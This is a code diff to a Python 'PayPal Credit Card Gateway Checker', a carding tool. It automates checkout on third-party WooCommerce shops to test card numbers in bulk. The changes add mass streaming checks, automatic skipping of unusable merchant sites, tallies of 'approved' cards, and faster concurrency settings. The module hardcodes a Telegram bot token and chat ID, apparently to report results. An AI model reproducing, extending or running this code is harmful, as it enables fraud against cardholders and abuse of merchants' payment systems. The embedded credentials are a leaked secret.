@@ -2,6 +2,11 @@
 """
 Async PayPal Credit Card Gateway Checker - Optimized for Production
 Supports high concurrency with proper resource management and error handling.
+Features:
+- Bad site auto-detection and removal
+- Streaming results for mass checking
+- Connection pooling and rate limiting
+- Optimized for fast production use
 """
 import asyncio
 import aiohttp
@@ -13,12 +18,16 @@ import os
 import logging
 from urllib.parse import urlparse, parse_qs, urlencode
 from datetime import datetime
-from typing import Dict, List, Tuple, Optional, Any
+from typing import Dict, List, Tuple, Optional, Any, Callable, AsyncGenerator
 import ssl
 
 # Import rate limiter and metrics
 from .rate_limiter import global_rate_limiter, domain_rate_limiter
 from .metrics import metrics_collector
+from .site_manager import (
+    load_sites, get_available_sites, check_and_handle_bad_site,
+    is_bad_response, add_bad_site, BAD_SITE_PATTERNS
+)
 
 # Configure logging
 logging.basicConfig(
@@ -37,15 +46,17 @@ _bin_cache = {}  # Simple dict cache for BIN info
 
 # Configuration
 class Config:
-    """Configuration settings for production use"""
+    """Configuration settings for production use - optimized for speed"""
     TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA')
     CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003171561914')
-    TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', '30'))
-    MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', '100'))
-    MAX_RETRIES = int(os.getenv('MAX_RETRIES', '3'))
-    RETRY_DELAY = float(os.getenv('RETRY_DELAY', '1.0'))
-    RATE_LIMIT_PER_SECOND = int(os.getenv('RATE_LIMIT_PER_SECOND', '10'))
-    BIN_CHECK_TIMEOUT = int(os.getenv('BIN_CHECK_TIMEOUT', '10'))
+    TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', '15'))  # Reduced for faster response
+    MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', '50'))  # Optimized concurrency
+    MAX_RETRIES = int(os.getenv('MAX_RETRIES', '2'))  # Reduced retries for speed
+    RETRY_DELAY = float(os.getenv('RETRY_DELAY', '0.5'))  # Faster retry
+    RATE_LIMIT_PER_SECOND = int(os.getenv('RATE_LIMIT_PER_SECOND', '20'))  # Increased rate limit
+    BIN_CHECK_TIMEOUT = int(os.getenv('BIN_CHECK_TIMEOUT', '5'))  # Faster BIN check
+    CONNECTION_LIMIT = int(os.getenv('CONNECTION_LIMIT', '100'))  # Connection pool size
+    CONNECTION_LIMIT_PER_HOST = int(os.getenv('CONNECTION_LIMIT_PER_HOST', '20'))  # Per-host limit
 
 # Address data
 class AddressData:
@@ -323,26 +334,52 @@ class AsyncCardChecker:
         return headers
 
     async def check(self) -> Dict[str, Any]:
-        """Check the card asynchronously"""
+        """Check the card asynchronously with bad site detection"""
         try:
             # Step 1: Get product page
             product_page = await self._get_product_page()
             if not product_page:
-                return self._error_result("Failed to load product page")
+                error_msg = "Failed to load product page"
+                # Check if this is a bad site issue
+                check_and_handle_bad_site(self.site_url, error_msg)
+                return self._error_result(error_msg, check_bad_site=True)
+
+            # Check for bad site patterns in product page
+            is_bad, reason = is_bad_response(product_page)
+            if is_bad:
+                add_bad_site(self.site_url, reason)
+                return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)
 
             # Step 2: Parse product ID
             product_id, variation_id = self._parse_product_id(product_page)
             if not product_id:
-                return self._error_result("Cannot find product ID")
+                error_msg = "Cannot find product ID"
+                check_and_handle_bad_site(self.site_url, error_msg)
+                return self._error_result(error_msg, check_bad_site=True)
 
             # Step 3: Add to cart
             atc_url = self._build_atc_url(product_id, variation_id)
-            await self._add_to_cart(atc_url)
+            atc_result = await self._add_to_cart(atc_url)
+            
+            # Check for out of stock in add to cart response
+            if atc_result:
+                is_bad, reason = is_bad_response(atc_result)
+                if is_bad:
+                    add_bad_site(self.site_url, reason)
+                    return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)
 
             # Step 4: Get checkout page
             checkout_html = await self._get_checkout()
             if not checkout_html:
-                return self._error_result("Failed to load checkout")
+                error_msg = "Failed to load checkout"
+                check_and_handle_bad_site(self.site_url, error_msg)
+                return self._error_result(error_msg, check_bad_site=True)
+
+            # Check for bad site patterns in checkout
+            is_bad, reason = is_bad_response(checkout_html)
+            if is_bad:
+                add_bad_site(self.site_url, reason)
+                return self._error_result(f"Bad site detected: {reason}", check_bad_site=True)
 
             # Step 5: Parse nonces and price
             nonces = self._parse_nonces(checkout_html)
@@ -351,12 +388,16 @@ class AsyncCardChecker:
             # Step 6: Get client ID
             access_token = await self._get_client_id(nonces.get('client_nonce'))
             if not access_token:
-                return self._error_result("Failed to get access token")
+                error_msg = "Failed to get access token"
+                check_and_handle_bad_site(self.site_url, error_msg)
+                return self._error_result(error_msg, check_bad_site=True)
 
             # Step 7: Create order
             order_id, custom_id = await self._create_order(nonces.get('create_order_nonce'))
             if not order_id:
-                return self._error_result("Failed to create order")
+                error_msg = "ERROR: Failed to create order"
+                check_and_handle_bad_site(self.site_url, error_msg)
+                return self._error_result(error_msg, check_bad_site=True)
 
             # Step 8: Confirm payment
             confirm_result = await self._confirm_payment(order_id, access_token)
@@ -367,12 +408,14 @@ class AsyncCardChecker:
             # Step 10: Process checkout
             payment_result = await self._process_checkout(custom_id, nonces.get('checkout_nonce'))
 
-            # Step 11: Parse result
+            # Step 11: Parse result (also checks for bad site patterns)
             return await self._parse_result(payment_result, price)
 
         except Exception as e:
             logger.error(f"Exception checking card {self.cc}: {e}")
-            return self._error_result(f"Exception: {str(e)}")
+            error_msg = f"Exception: {str(e)}"
+            check_and_handle_bad_site(self.site_url, error_msg)
+            return self._error_result(error_msg)
 
     async def _get_with_retry(self, url: str, headers: Dict, **kwargs) -> Optional[str]:
         """Get URL with retry logic, rate limiting, and metrics"""
@@ -812,34 +855,74 @@ class AsyncCardChecker:
         result['response_text'] = response_text
         return result
 
-    def _error_result(self, message: str) -> Dict[str, Any]:
-        """Create error result"""
+    def _error_result(self, message: str, check_bad_site: bool = False) -> Dict[str, Any]:
+        """Create error result with bad site detection"""
+        elapsed_time = time.time() - self.start_time
+        
+        # Format error response text
+        response_text = f"""ERROR ❌
+
+𝗖𝗖 ⇾ {self.cc_data}
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Ppcp-gateway
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {message}
+𝗦𝗶𝘁𝗲 ⇾ {self.hostname}
+
+𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""
+
         return {
             'cc': self.cc_data,
             'site': self.hostname,
             'status': 'ERROR',
             'message': message,
-            'bin_info': {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown', 'issuer': 'Unknown', 'country': 'Unknown'}
+            'bin_info': {'brand': 'Unknown', 'type': 'Unknown', 'level': 'Unknown', 'issuer': 'Unknown', 'country': 'Unknown'},
+            'response_text': response_text,
+            'bad_site_detected': check_bad_site
         }
 
 async def create_session() -> aiohttp.ClientSession:
-    """Create a shared session with connection pooling"""
+    """Create a shared session with optimized connection pooling for production"""
     connector = aiohttp.TCPConnector(
-        limit=Config.MAX_CONCURRENT_REQUESTS,
-        limit_per_host=10,
-        ttl_dns_cache=300,
+        limit=Config.CONNECTION_LIMIT,
+        limit_per_host=Config.CONNECTION_LIMIT_PER_HOST,
+        ttl_dns_cache=600,  # Cache DNS for 10 minutes
         use_dns_cache=True,
-        ssl=False  # Disable SSL verification for flexibility
+        ssl=False,  # Disable SSL verification for flexibility
+        keepalive_timeout=30,  # Keep connections alive
+        enable_cleanup_closed=True,  # Clean up closed connections
+        force_close=False  # Reuse connections
     )
-    return aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=Config.TIMEOUT))
+    
+    timeout = aiohttp.ClientTimeout(
+        total=Config.TIMEOUT,
+        connect=5,  # Fast connection timeout
+        sock_read=10  # Socket read timeout
+    )
+    
+    return aiohttp.ClientSession(
+        connector=connector, 
+        timeout=timeout,
+        trust_env=True
+    )
 
 async def check_single_card(card_details: str, site_urls: List[str], proxy: Optional[str] = None) -> str:
-    """Check a single card asynchronously"""
+    """Check a single card asynchronously with bad site handling"""
     global _session
     if _session is None:
         _session = await create_session()
     
-    site_url = random.choice(site_urls) if site_urls else "https://example.com"
+    # Get available sites (excluding bad ones)
+    available_sites = get_available_sites() if not site_urls else site_urls
+    
+    if not available_sites:
+        # Fallback to original sites if all are marked bad
+        available_sites = site_urls if site_urls else load_sites()
+    
+    if not available_sites:
+        return "❌ No sites available! All sites may be marked as bad."
+    
+    site_url = random.choice(available_sites)
     
     checker = AsyncCardChecker(card_details, site_url, proxy, _session)
     result = await checker.check()
@@ -847,7 +930,7 @@ async def check_single_card(card_details: str, site_urls: List[str], proxy: Opti
     return result.get('response_text', f"ERROR: {result.get('message', 'Unknown error')}")
 
 async def check_multiple_cards(card_list: List[str], site_list: List[str], max_concurrent: int = 10) -> List[str]:
-    """Check multiple cards with controlled concurrency"""
+    """Check multiple cards with controlled concurrency (returns all results at once)"""
     semaphore = asyncio.Semaphore(max_concurrent)
     
     async def check_with_semaphore(card):
@@ -866,6 +949,128 @@ async def check_multiple_cards(card_list: List[str], site_list: List[str], max_c
             formatted_results.append(result)
     
     return formatted_results
+
+
+async def check_cards_streaming(
+    card_list: List[str], 
+    site_list: List[str], 
+    max_concurrent: int = 10,
+    callback: Optional[Callable[[int, str, str], Any]] = None
+) -> AsyncGenerator[Tuple[int, str, str], None]:
+    """
+    Check multiple cards with streaming results - yields each result immediately.
+    
+    Args:
+        card_list: List of cards to check
+        site_list: List of site URLs
+        max_concurrent: Maximum concurrent checks
+        callback: Optional callback function(index, card, result) called for each result
+        
+    Yields:
+        Tuple of (index, card, result) for each card as it completes
+    """
+    global _session
+    if _session is None:
+        _session = await create_session()
+    
+    # Get available sites
+    available_sites = get_available_sites() if not site_list else site_list
+    if not available_sites:
+        available_sites = site_list if site_list else load_sites()
+    
+    if not available_sites:
+        for i, card in enumerate(card_list):
+            result = "❌ No sites available! All sites may be marked as bad."
+            if callback:
+                await callback(i, card, result) if asyncio.iscoroutinefunction(callback) else callback(i, card, result)
+            yield (i, card, result)
+        return
+    
+    semaphore = asyncio.Semaphore(max_concurrent)
+    results_queue = asyncio.Queue()
+    
+    async def check_card_task(index: int, card: str):
+        """Check a single card and put result in queue"""
+        async with semaphore:
+            try:
+                site_url = random.choice(available_sites)
+                checker = AsyncCardChecker(card, site_url, None, _session)
+                result_dict = await checker.check()
+                result = result_dict.get('response_text', f"ERROR: {result_dict.get('message', 'Unknown error')}")
+            except Exception as e:
+                result = f"ERROR: Exception checking card: {str(e)}"
+            
+            await results_queue.put((index, card, result))
+    
+    # Start all tasks
+    tasks = [asyncio.create_task(check_card_task(i, card)) for i, card in enumerate(card_list)]
+    
+    # Yield results as they complete
+    completed = 0
+    total = len(card_list)
+    
+    while completed < total:
+        index, card, result = await results_queue.get()
+        completed += 1
+        
+        # Call callback if provided
+        if callback:
+            if asyncio.iscoroutinefunction(callback):
+                await callback(index, card, result)
+            else:
+                callback(index, card, result)
+        
+        yield (index, card, result)
+    
+    # Wait for all tasks to complete (cleanup)
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+
+async def check_cards_with_immediate_callback(
+    card_list: List[str],
+    site_list: List[str],
+    on_result: Callable[[int, str, str], Any],
+    max_concurrent: int = 10
+) -> dict:
+    """
+    Check multiple cards and call callback immediately for each result.
+    
+    Args:
+        card_list: List of cards to check
+        site_list: List of site URLs
+        on_result: Callback function(index, card, result) called immediately for each result
+        max_concurrent: Maximum concurrent checks
+        
+    Returns:
+        Summary dict with counts
+    """
+    approved_count = 0
+    declined_count = 0
+    error_count = 0
+    
+    async for index, card, result in check_cards_streaming(card_list, site_list, max_concurrent):
+        # Call the callback immediately
+        if asyncio.iscoroutinefunction(on_result):
+            await on_result(index, card, result)
+        else:
+            on_result(index, card, result)
+        
+        # Count results
+        if "CCN" in result and "✅" in result:
+            approved_count += 1
+        elif "CVV" in result and "✅" in result:
+            approved_count += 1
+        elif "ERROR" in result:
+            error_count += 1
+        else:
+            declined_count += 1
+    
+    return {
+        'total': len(card_list),
+        'approved': approved_count,
+        'declined': declined_count,
+        'errors': error_count
+    }
 
 async def cleanup():
     """Cleanup resources"""
